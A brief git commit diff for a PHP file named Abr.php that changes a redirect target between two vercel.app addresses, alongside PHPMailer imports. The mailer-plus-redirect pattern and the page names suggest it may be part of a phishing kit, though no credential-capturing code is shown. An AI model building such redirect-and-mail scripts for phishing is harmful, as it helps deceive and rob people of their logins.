181465790f9c17e366d9eaaf5e4caa2de5191f9c
Ontres44322 <onlinemeta858@gmail.com>
2025-07-10 01:47:36 +0500

    Update Abr.php

--- Abr.php
+++ Abr.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://open-your-team.vercel.app/");
+header("Location: https://open-account-page.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
